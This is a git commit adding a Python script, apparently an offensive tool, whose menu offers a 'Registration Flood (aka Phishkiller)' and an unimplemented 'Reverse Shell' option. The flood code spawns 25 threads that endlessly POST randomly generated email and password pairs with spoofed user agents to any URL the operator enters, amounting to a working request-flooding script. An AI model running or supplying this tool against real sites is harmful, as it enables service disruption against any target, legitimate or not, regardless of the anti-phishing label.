a7a92136b18192d9a7e5a01fcad1faf2547fe156
4ozde <csi78@uclive.ac.nz>
2024-06-30 22:16:13 +1200

    first commit

---
+++ main.py
@@ -0,0 +1,111 @@
+import time
+import colorama
+from colorama import Fore, Back, Style
+
+import threading
+import requests
+import random
+import string
+import names
+import subprocess
+
+import time
+
+from fake_useragent import UserAgent
+
+def menu():
+    colorama.init()
+    title = """
+                                                                                                           
+  ****           *                                                        ***** ***                 **    
+ *  *************                                                      ******  * **                  **   
+*     *********                                                       **   *  *  **                  **   
+*     *  *                                                           *    *  *   **                  **   
+ **  *  **                    ***    ***                  ****           *  *    *                   **   
+    *  ***            ***    * ***  **** *     ****      * **** *       ** **   *       ***      *** **   
+   **   **           * ***      *** *****     * ***  *  **  ****        ** **  *       * ***    ********* 
+   **   **          *   ***      ***  **     *   ****  ****             ** ****       *   ***  **   ****  
+   **   **         **    ***      ***       **    **     ***            ** **  ***   **    *** **    **   
+   **   **         ********      * ***      **    **       ***          ** **    **  ********  **    **   
+    **  **         *******      *   ***     **    **         ***        *  **    **  *******   **    **   
+     ** *      *   **          *     ***    **    **    ****  **           *     **  **        **    **   
+      ***     *    ****    *  *       *** * **    **   * **** *        ****      *** ****    * **    **   
+       *******      *******  *         ***   ***** **     ****        *  ****    **   *******   *****     
+         ***         *****                    ***   **               *    **     *     *****     ***      
+                                                                     *                                    
+                                                                      **                                  
+                                                                                                
+                                                                                                          
+                                                                                                          
+"""
+
+    print(Fore.RED + title)
+    print(Fore.WHITE)
+    print("1. Registration Flood (aka Phishkiller)\n")
+    print("2. Reverse Shell\n")
+    choice = input("Select: ")
+
+    if choice == "1":
+        print("\n")
+        pkmain()
+
+
+def name_gen():
+    name_system = random.choice(["FullName", "FullFirstFirstInitial", "FirstInitialFullLast"])
+    first_name = names.get_first_name()
+    last_name = names.get_last_name()
+    if name_system == "FullName":
+        return first_name + last_name
+    elif name_system == "FullFirstFirstInitial":
+        return first_name + last_name[0]
+    return first_name[0] + last_name
+
+def generate_random_email():
+    name = name_gen()
+    NumberOrNo=random.choice(["Number", "No"])
+    domain = random.choice(["@gmail.com", "@yahoo.com", "@rambler.ru", "@protonmail.com", "@outlook.com", "@itunes.com"])#Popular email providers
+    if NumberOrNo == "Number":
+        return name + str(random.randint(1, 100)) + domain
+    else:
+        return name + domain
+
+def generate_random_password():
+    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
+
+def send_posts(url):
+    while True:
+        email = generate_random_email()
+        password = generate_random_password()
+        data = {"a": email, "az": password}
+        ua = UserAgent()
+        user_agent = ua.random
+        headers = {'User-Agent': user_agent}
+        response = requests.post(url, data=data, headers=headers,)
+        print(f"Email: {email}, Password: {password}, Status Code: {response.status_code}, headers: {user_agent}")
+
+def pkmain():
+    url = input("Enter the URL of the target you want to flood: ")
+    length = int(input("\nEnter time in seconds you want to flood: "))
+    threads = [threading.Thread(target=send_posts, args=(url,), daemon=True) for _ in range(25)]
+
+    for t in threads:
+        t.start()
+
+    for t in threads:
+        t.join()
+
+    time.sleep(length)
+
+    print("\n")
+    print("\n")
+    print("\n")
+    print("Flood complete.  Back to menu...")
+    time.sleep(3)
+    print("\033[H\033[J")
+    menu()
+
+
+
+
+if __name__ == '__main__':
+    menu()
